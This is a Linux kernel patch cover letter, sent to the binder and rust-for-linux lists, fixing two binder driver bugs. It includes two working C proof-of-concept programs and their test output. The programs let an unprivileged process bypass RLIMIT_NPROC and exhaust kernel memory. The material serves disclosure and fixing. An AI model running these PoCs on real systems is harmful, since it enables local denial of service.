Received: from GVXPR05CU001.outbound.protection.outlook.com (mail-swedencentralazon11013055.outbound.protection.outlook.com [52.101.83.55])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C33FB1474CC;
	Wed,  3 Jun 2026 18:02:21 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.83.55
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780509743; cv=fail; b=CgKaBbyjCC75VK6ahthCYaSjvGuQ/XA8AKH7ZvxH6o+dU7ugWzI54rNjPnK1mOwFdFOe9zGHesvmZXZRmDNwPdfxCQJZHEqzGNxR1bNXWR/JFjD0LOBVrbBTenJ6y6a1JyVpsyjobIP2ImP+2geS2J5KPlsZAXBocabowg3xvWM=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780509743; c=relaxed/simple;
	bh=uW/0dCdfnDvHQeh93ghK6ywUZNU1lT3rxE4nI0iKxk0=;
	h=From:Subject:Date:Message-Id:Content-Type:To:Cc:MIME-Version; b=TW2jJCiqBLtFKp+DfLqENSZM0nbkupGuunTalNyLMmbJowzo8a+aVUlPEJkW6uw/8EG4H0ORyOzJOWOiZrJqUeqIJ41WXKYnn7k/GKsapiKOjrllzPjViCbKnBgX2ok99Fltog2R0PEwncKeCfyB5e2k6uuEismo3reGw+O3+/A=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=est.tech; spf=pass smtp.mailfrom=est.tech; dkim=pass (2048-bit key) header.d=est.tech header.i=@est.tech header.b=CXuP6rcK; arc=fail smtp.client-ip=52.101.83.55
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=est.tech
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=est.tech
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=est.tech header.i=@est.tech header.b="CXuP6rcK"
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=Sznf0FB+9m2EL4NjR75sp+Df8zZBmz0chsjwZTR9UzQiI+2Kai0yX5dATnhHmAG4rJJKkX9PY6qOqzC769gfOAM/j1SkYGOF/bGnKwRnQRSbPiTY6z0Ni6guRxJUQqdEHjHlI/L7Lkbk+CLXBsaBLkVkxWzeDTbW1zdqsd7P/h3b9lSI8OdOJZE439lmWAcKx2nVGBrWEwrrVN6U8CgJHI0BaVkDtnVdM/xBt5uHaLU+/CGOuWjmIXddqIH06FjvURPXfJiMAt4tYPN/YrcahX8FNKatTl+MV1yVEFwY9IaVdtqvBx5Y55FYB+kGsQcCsYdl6Yty8zk2dqyIjPUKIA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=Wxk2R/lYMqolGLuSuVaY4KWvlGRYBnwU0+EtvZngoNk=;
 b=GAgMYqRr+d7XmBcl4icCRbCLP4NLJ24VBvqG3GTfLXUVG9pcn3ULLOMIc2StHYB3wBYXa2sgOsgoW2HcxenHWTvfb0VuQtHlReCjGSoH5iJB3iC94He7upsy9Brk6+v6mrygU+RMdXWPf81t/dcFO0+NbTN3iH4r+i3oXfpUkTAjbHuCKcHddCNCqtX+DqOuRXFoKlGWG6xYLYFtMxoWpYcVqcH36TizmaCuWNKYHBFi8Q/cQOcCmu8Xt2RJKljEw7SEGku+C0N4ISZdcu7UveX3lnAWrdYlj5j6X6B25ihTqWD9iIx5mXCQeJap+nCxwt8cvsVCzUeZFaOYd+EWsA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=est.tech; dmarc=pass action=none header.from=est.tech;
 dkim=pass header.d=est.tech; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=est.tech; s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=Wxk2R/lYMqolGLuSuVaY4KWvlGRYBnwU0+EtvZngoNk=;
 b=CXuP6rcKH+TXPBvZou171F48A8ZinxPKWuzVsDZQVyLVqcWr7xiDILeBPIYyzrk0VJbUcgH6WWq7XQOT8qaUb6+U3eO1JbPjPvpjyAPPiML17Og0UxI+oRWNcSXeb5qrhKWq5zr5vD2Xhs/qVb/lv/kazVvm/uCtx4OMeCvUxJuJkDxMoosKS/BT/r3mvlYlmYAMenq4dPXGtGqHP+r6toQFgD1O5/LRgh5Iqq/FhX+Cju6lRPA9UbUVmCxjLxSyn5fc91PKAPmAZ3U31upzefL3HBdZhRZYWOZ1P7OunGByv5NuvOiezTM7RHq27zOe8dntnZbRsp+Q531dKByuww==
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=est.tech;
Received: from AS8P189MB1752.EURP189.PROD.OUTLOOK.COM (2603:10a6:20b:39b::19)
 by DB8P189MB1063.EURP189.PROD.OUTLOOK.COM (2603:10a6:10:148::13) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.92.7; Wed, 3 Jun 2026
 18:02:18 +0000
Received: from AS8P189MB1752.EURP189.PROD.OUTLOOK.COM
 ([fe80::69fc:c4d4:200b:e4b4]) by AS8P189MB1752.EURP189.PROD.OUTLOOK.COM
 ([fe80::69fc:c4d4:200b:e4b4%7]) with mapi id 15.21.0092.006; Wed, 3 Jun 2026
 18:02:18 +0000
From: Yunseong Kim <yunseong.kim@est.tech>
Subject: [PATCH 0/4] binder: cap max_threads and reject duplicate looper
 entry
Date: Wed, 03 Jun 2026 20:01:41 +0200
Message-Id: <20260603-b4-binder-hardening-v1-0-d0aae3556c9b@est.tech>
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit
X-B4-Tracking: v=1; b=H4sIAAVsIGoC/x3MPQqAMAxA4atIZgO1LfXnKuJQbdQsUVIQQby7x
 fEb3nsgkzJlGKoHlC7OfEhBU1ew7FE2Qk7FYI0NJhiHs8eZJZHiHjWRsGxovbdL64PrXA+lPJV
 Wvv/rOL3vB14wn7xlAAAA
X-Change-ID: 20260603-b4-binder-hardening-2442c7463839
To: Greg Kroah-Hartman <gregkh@linuxfoundation.org>, 
 =?utf-8?q?Arve_Hj=C3=B8nnev=C3=A5g?= <arve@android.com>, 
 Todd Kjos <tkjos@android.com>, Christian Brauner <brauner@kernel.org>, 
 Carlos Llamas <cmllamas@google.com>, Alice Ryhl <aliceryhl@google.com>, 
 Brian Swetland <swetland@google.com>, Miguel Ojeda <ojeda@kernel.org>, 
 Boqun Feng <boqun@kernel.org>, Gary Guo <gary@garyguo.net>, 
 =?utf-8?q?Bj=C3=B6rn_Roy_Baron?= <bjorn3_gh@protonmail.com>, 
 Benno Lossin <lossin@kernel.org>, Andreas Hindborg <a.hindborg@kernel.org>, 
 Trevor Gross <tmgross@umich.edu>, Danilo Krummrich <dakr@kernel.org>
Cc: Greg Kroah-Hartman <gregkh@suse.de>, linux-kernel@vger.kernel.org, 
 rust-for-linux@vger.kernel.org, Yunseong Kim <yunseong.kim@est.tech>, 
 Yunseong Kim <ysk@kzalloc.com>
X-Mailer: b4 0.15.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1780509735; l=5441;
 i=yunseong.kim@est.tech; s=20260426; h=from:subject:message-id;
 bh=uW/0dCdfnDvHQeh93ghK6ywUZNU1lT3rxE4nI0iKxk0=;
 b=drG9ciThjJZSNG9Js6DF8vJz6Sy+XSrHDo3YEUiXgN4QyH4jBIi/L3Z1jfeQ5/hcH9++IT2AS
 0iZt9saII94D/Eg8lkxTj10yeJE+DlARHEyBtZ5NJ2NP6Xr6zyU032m
X-Developer-Key: i=yunseong.kim@est.tech; a=ed25519;
 pk=1nBUX92cvTaavYG1+MR073D+XMKhdOciBZcnf6h6qEo=
X-ClientProxiedBy: DU6P191CA0061.EURP191.PROD.OUTLOOK.COM
 (2603:10a6:10:53e::14) To AS8P189MB1752.EURP189.PROD.OUTLOOK.COM
 (2603:10a6:20b:39b::19)
Precedence: bulk
X-Mailing-List: rust-for-linux@vger.kernel.org
List-Id: <rust-for-linux.vger.kernel.org>
List-Subscribe: <mailto:rust-for-linux+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:rust-for-linux+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: AS8P189MB1752:EE_|DB8P189MB1063:EE_
X-MS-Office365-Filtering-Correlation-Id: 6ce87836-e9ce-4468-b89e-08dec19a4044
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam:
	BCL:0;ARA:13230040|7416014|376014|1800799024|366016|921020|6133799003|56012099006|11063799006|5023799004|3023799007|18002099003;
X-Microsoft-Antispam-Message-Info:
	88D+ab4c9H6OvIBoYwV9H8EYeqGrLANWxotjCDUTJGO5yHCaf/K0NqNS+X3B97+ytBvvolxvDp2TXdv9epIBeaJNXv115qtxvxOnsVxE1hEsFKtmJY+uJqowkYbEgpgfZqB0TzNsH/CG9TBEtuBzO2ccQE+VlvqX+xBHG4XYkoV/4sl/t57rHl2Vb5eszBOSF3+zB7fhGt7uGW0JiVNtphTrjJXKQPOG1jllCk5FqUAmVMqcmoESdJP496vfkgy4MlVFKjSYXiL+/QEy18Q0Tv3tnf65ePMH8mpg1mQLofMYUz7T5WqUzWvk1XwMkceWYE/rMauzz3xMxtecS1XQexKc9QUjg5DJEBGtW5f4Q5xFb6y5GgxHjcJjRwiWLBH+jyR9kjF/BCgBZn4QdIfgCSzJi8N6bdB7gth1gh5/5HJXkWFaBfwpN3E3MPqUQ7KLc8en2NK3G2mS+6IRyW759qC2EorQaNDCF12s7SFp271KH0kJUlv2ZGum6XhteCur1sb6M1b5Xn6E++glk7pz0mhcCkhym4s2VnmdbeugjmLOON7kjBa/PHGo3ZXurpyeFXYupxCFpXDNKd6K1xdT/GZNUy405gGq3QTlivewZSOscP9Lfj36SzkMhhFSDbQISS1sG6GQkYCRxoLh+symSvRTI659JdtIdEtt9F6R/8YBUhfLVvkjleL3fMW3gafXy3tnsZF/6/xtzfahoFFcYp9IzhOiaahtdLAjvZ7+3p4GhelPLElzQsJupk/2tH3n
X-Forefront-Antispam-Report:
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:AS8P189MB1752.EURP189.PROD.OUTLOOK.COM;PTR:;CAT:NONE;SFS:(13230040)(7416014)(376014)(1800799024)(366016)(921020)(6133799003)(56012099006)(11063799006)(5023799004)(3023799007)(18002099003);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0:
	=?utf-8?B?RVUxcXpzb3VmOHVVUVA5ZWs5RUhrN3dkb0pjcHN1UHYvN2VkbmZOUE1ZMHda?=
 =?utf-8?B?TTRLSG5hZE1vSDhiZDVySGdTU3M5MnZjM0c4d2EyV3ZIcXdTL2pqblNSZjkv?=
 =?utf-8?B?bDhzdFMzQmp3WnZYNnUvSTB0T1c4Tm5XUHFPTjRnRVZzL1NGUVZQQm1wbzB4?=
 =?utf-8?B?ZVVNZll1YzhweEFtMXV6TXBDcjdkMjdzWm8wVlVsOXJhMnpSSjRVZ2ZqL3k2?=
 =?utf-8?B?SnQvU2d2WGdGZk1pQmtzQzMxVit5blBtMVBTV3Z0RTJ2TGYxR1l4empOeSs4?=
 =?utf-8?B?TDBEb2w3Sm5ReVg1blMwVEh4cVA2TFVHSkNjTkJIUTdJakFXSklRMGl3M2s0?=
 =?utf-8?B?bkVPc2hYamluUzVvL1lNaXpVUmpjcWtKTnRFMmQ3RVQ5d0R1NHVybW91YU1C?=
 =?utf-8?B?WGk0Vk1JWUhUanloRWJsODJGZkRuSVFJaXdLMjhlckJlb2ltUFo0L0FpT1A1?=
 =?utf-8?B?YXpSUnNhS1BEMkFsYXpWN2thTnVlREZDc2RpeVBDMEZ0SG9pZnU3RndwR2oz?=
 =?utf-8?B?SUhCYkJFT1E5NHVVNlRxNzBUbW5Ydnp4OWo1WlFhUUgwbkZuVCttMERqSEZJ?=
 =?utf-8?B?bnFwRVV2cG9OU3poRUVWYTM1bWo0UjBPbUNxeE4rRGM2bFUvb3puTVBpalkr?=
 =?utf-8?B?MDMzZTg4dEZYUkYxMmNna21jdXNyUWg3RDkyK3lHU3lKcW9pZ3ErOTdBR1hu?=
 =?utf-8?B?TG5KMVBFekwzM01GT0ltZU1iM0hOei9zTXFpOWhXN2lCYXlLRjJJWVZCTWtz?=
 =?utf-8?B?N3NuOUZwVUVwTldsRWZDTUN0QWlhVEhZWUVRK2h2MWl1akw1Nll0YWg3LzdF?=
 =?utf-8?B?YUNzZFF1eW15OG1hM1JWN1NacjZ2bHF5bzNrZWZjclU3OXBhbFMzdyt5eks0?=
 =?utf-8?B?NGMzTTY2VG82YnArdTVtSldmdlU4c0tPc0NzclE4cVBmUzNlSFljRkRkSUJq?=
 =?utf-8?B?clB1djE0ZVg3ek9ZNUtVdk00Sk9mZTNDTzMzenNNblFnK1FWNzQ1NU1lc282?=
 =?utf-8?B?cEFuSU1rSi9XdS8zWG5RTmFTVmRFT01IbVpLM2dEWllIdTRMYTliMFZwZlAr?=
 =?utf-8?B?Q0J0NWNacVBXRFlyL09idjR1RGsyV0ttQ0xCSnBpZWdWUnFjYjZrYXpkWlky?=
 =?utf-8?B?WkZmRGMzcnJoc0YrQTJqdW54eC8vVHpNQkpzZU1NZlNWVUpsOXZ4MGtUMzlJ?=
 =?utf-8?B?S2xZeHFvcG5uSDhKeUo0Tk01TW8vTk5XOFVMUCsxaUVDL0Z1UzRmcytHRXpN?=
 =?utf-8?B?SlpOS1JubE54T01LSUxnV0FWbjYwa21QOWloc1lDaFdHQmx2VkEyZURVVk8y?=
 =?utf-8?B?NnpXbEFrS2dmVHprS3IxNGJaREJRVTFlRXZycUs3WjNaUUVCY3dxMmpYbDN5?=
 =?utf-8?B?Szh2UTY3a0dSZ21SdU5pODlzdjVlZXVXZHc1VDk2V3ZyK0hJY2x2cGg0VlJQ?=
 =?utf-8?B?ajYwOEIreEJDdThFQlEyckVlSW9sckI0dC9KNEl2MFJicDJieHRTRXlKeXgz?=
 =?utf-8?B?QVM1eHMrWnhIYjViYXcycFFEUnF4WlpLb3RCV0dSZDd1SXJVSUQvNlp0b3VE?=
 =?utf-8?B?SGt4OXZncUdJcGVQK3VqTHprYTFwNmZENUtSVTBhTDYzandXUVJlWUhJa2dz?=
 =?utf-8?B?NmhGeWg1MDR3a3pINTlGc0IwbVh0NkthUjhGSzlWdEtEVDFKNG9xeXRrZ25P?=
 =?utf-8?B?RnVGSDlncEdGSTB1V3lxV2hxeDlWY3ZWNHdnV0JtT1Y3R3BBVmYwenlaQitw?=
 =?utf-8?B?cWlBbnJva0lvZnRpM3R4ZEZSYy91SEwrNmprbnV5SkU0M1VTdGFoVXBSNUxM?=
 =?utf-8?B?WFk2YUdXeE1FQWwwUFpKYUtqR212VzhZZG9qbmNYdmowODlvT2lJZnZCQjBq?=
 =?utf-8?B?YUsxRUlTUGpTd2tTblJiVGJONTNsWkhySDhMVGJBaisvcllBRHFWUTI1MWtz?=
 =?utf-8?B?ajVBdGRHVVQ1VkpCbTc4NDlwbUZIUXYwbnMrYWxPWjFrS0Nka3JHNEVPK2x6?=
 =?utf-8?B?N0d3Qm00OFpob1FOVzRhUVVmOGdTYXpiTGJpOXlLakRqYTdMTUJWck9WY2V0?=
 =?utf-8?B?MzdKK1hkbTRHUHRxMDFwZnlueThpTThPYTMzSm1iait6bENncWFsVlZwNldB?=
 =?utf-8?B?Vzdsa2xvYXZuVVgzR0ZJR3ZMdjIzdWkrMisvWmYwMHZFVmh2aFI0VmlDZkI2?=
 =?utf-8?B?RWRyVEZYQ1NGOHdVSXd5Sy9vTFExdmg3SHg3ZVppdTFpZTJ6Y3FrclZmRHov?=
 =?utf-8?B?ZmczMG1MSkxCTzk0QXJHYkZ3QklwSE9ybmMrN0tFRGZYTjZsVk9URWhlOE9V?=
 =?utf-8?B?UWVNSUFaNlAvc1B2QjZuTjVNNzlEZUVadC9tY01Ia0dNMEt5c055dz09?=
X-OriginatorOrg: est.tech
X-MS-Exchange-CrossTenant-Network-Message-Id: 6ce87836-e9ce-4468-b89e-08dec19a4044
X-MS-Exchange-CrossTenant-AuthSource: AS8P189MB1752.EURP189.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 Jun 2026 18:02:18.1861
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: d2585e63-66b9-44b6-a76e-4f4b217d97fd
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: AQeb5J9BAUSHwNn/aK7M1teMW2z+YpU/Lr52WKldEAXdznot5qs/o0dddNwJgtkQqqaBsE7XuZhoGOILS/4NMQ==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DB8P189MB1063

Two logic bugs in the Android binder driver (both C and Rust implementations)
allow an unprivileged userspace process to bypass RLIMIT_NPROC and exhaust
kernel memory, leading to system-wide denial of service.

Bug 1: BINDER_SET_MAX_THREADS has no upper bound check
Bug 2: BC_ENTER_LOOPER accepts duplicates without error

These were discovered using kcov-dataflow [1], a per-task function boundary
extraction tool that captures argument values at -O2 where other tools
(KASAN, ftrace, edge coverage) cannot detect logic errors.

[1] https://github.com/yskzalloc/kcov-dataflow
[2] https://lore.kernel.org/all/20260603-kcov-dataflow-next-20260603-v2-0-fee0939de2c4@est.tech/
[3] https://github.com/llvm/llvm-project/pull/201410

--- Userspace PoC (To-Ulimit-and-Beyond.c) ---

/*
 * To-Ulimit-and-Beyond: Demonstrates both bugs from unprivileged userspace.
 * Build: gcc -static -o To-Ulimit-and-Beyond To-Ulimit-and-Beyond.c
 * Run:   ulimit -u 50; ./To-Ulimit-and-Beyond
 *
 * Expected (before fix):
 *   VULNERABLE: kernel accepted max_threads=4294967295!
 *   VULNERABLE: duplicate BC_ENTER_LOOPER accepted!
 *
 * Expected (after fix):
 *   PATCHED: kernel rejected the value
 *   (second BC_ENTER_LOOPER marks thread INVALID internally)
 */

struct binder_write_read {
    int64_t write_size, write_consumed;
    uint64_t write_buffer;
    int64_t read_size, read_consumed;
    uint64_t read_buffer;
};

int main(void)
{
    int fd = open("/dev/binderfs/binder", O_RDWR);
    if (fd < 0) fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { perror("open binder"); return 1; }
    mmap(NULL, 128*1024, PROT_READ, MAP_PRIVATE, fd, 0);

    printf("pid=%d uid=%d\n", getpid(), getuid());

    /* Bug 1: SET_MAX_THREADS with no upper bound */
    uint32_t max = 0xFFFFFFFF;
    int ret = ioctl(fd, BINDER_SET_MAX_THREADS, &max);
    printf("[Bug 1] SET_MAX_THREADS=0xFFFFFFFF: %s (errno=%d)\n",
           ret == 0 ? "VULNERABLE" : "PATCHED", ret < 0 ? errno : 0);

    /* Bug 2: BC_ENTER_LOOPER duplicate */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {
        .write_size = sizeof(cmd),
        .write_buffer = (uint64_t)(unsigned long)&cmd,
    };
    ioctl(fd, BINDER_WRITE_READ, &bwr);
    bwr.write_consumed = 0;
    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("[Bug 2] BC_ENTER_LOOPER x2: ret=%d (thread now INVALID if patched)\n", ret);

    close(fd);
    return 0;
}

--- ulimit bypass PoC (beyond_ulimit.c) ---

/*
 * Demonstrates RLIMIT_NPROC bypass via binder.
 * With ulimit -u 50, creates 300 threads.
 * Build: gcc -static -pthread -o beyond_ulimit beyond_ulimit.c
 * Run:   ulimit -u 50; ./beyond_ulimit
 */

struct binder_write_read {
    int64_t write_size, write_consumed;
    uint64_t write_buffer;
    int64_t read_size, read_consumed;
    uint64_t read_buffer;
};

static void *binder_thread(void *arg)
{
    int fd = open("/dev/binderfs/binder", O_RDWR);
    if (fd < 0) fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return NULL;
    mmap(NULL, 128*1024, PROT_READ, MAP_PRIVATE, fd, 0);
    uint32_t max = 0xFFFFFFFF;
    ioctl(fd, BINDER_SET_MAX_THREADS, &max);
    uint32_t cmd = BC_REGISTER_LOOPER;
    struct binder_write_read bwr = {
        .write_size = sizeof(cmd),
        .write_buffer = (uint64_t)(unsigned long)&cmd,
    };
    ioctl(fd, BINDER_WRITE_READ, &bwr);
    close(fd);
    return NULL;
}

int main(void)
{
    printf("pid=%d uid=%d\n", getpid(), getuid());
    int created = 0;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 16384);
    for (int i = 0; i < 300; i++) {
        pthread_t t;
        if (pthread_create(&t, &attr, binder_thread, NULL)) break;
        pthread_detach(t);
        created++;
    }
    usleep(500000);
    printf("Threads created: %d (ulimit was 50)\n", created);
    if (created > 50)
        printf("VULNERABLE: RLIMIT_NPROC bypassed!\n");
    return 0;
}

--- Test results ---

Kernel: 7.1.0-rc5-next-20260528 (CONFIG_ANDROID_BINDER_IPC_RUST=y)
VM: virtme-ng, 1GB RAM, single vCPU

Before fix:
  $ su -s /bin/bash nobody -c 'ulimit -u 50; ./To-Ulimit-and-Beyond'
  pid=288 uid=65534
  [Bug 1] SET_MAX_THREADS=0xFFFFFFFF: VULNERABLE (errno=0)
  [Bug 2] BC_ENTER_LOOPER x2: ret=0

  $ su -s /bin/bash nobody -c 'ulimit -u 50; ./beyond_ulimit'
  Threads created: 300 (ulimit was 50)
  VULNERABLE: RLIMIT_NPROC bypassed!

After fix:
  $ su -s /bin/bash nobody -c 'ulimit -u 50; ./To-Ulimit-and-Beyond'
  pid=283 uid=65534
  [Bug 1] SET_MAX_THREADS=0xFFFFFFFF: PATCHED (errno=22)
  [Bug 2] BC_ENTER_LOOPER x2: ret=0 (thread marked INVALID)

Signed-off-by: Yunseong Kim <yunseong.kim@est.tech>
---
Yunseong Kim (4):
      binder: cap BINDER_SET_MAX_THREADS at RLIMIT_NPROC
      binder: reject duplicate BC_ENTER_LOOPER commands
      rust_binder: cap set_max_threads at RLIMIT_NPROC
      rust_binder: reject duplicate BC_ENTER_LOOPER in looper_enter

 drivers/android/binder.c          | 10 ++++++++++
 drivers/android/binder/process.rs | 15 +++++++++++++--
 drivers/android/binder/thread.rs  |  4 ++++
 3 files changed, 27 insertions(+), 2 deletions(-)
---
base-commit: f7af91adc230aa99e23330ecf85bc9badd9780ad
change-id: 20260603-b4-binder-hardening-2442c7463839

Best regards,
--  
Yunseong Kim <yunseong.kim@est.tech>

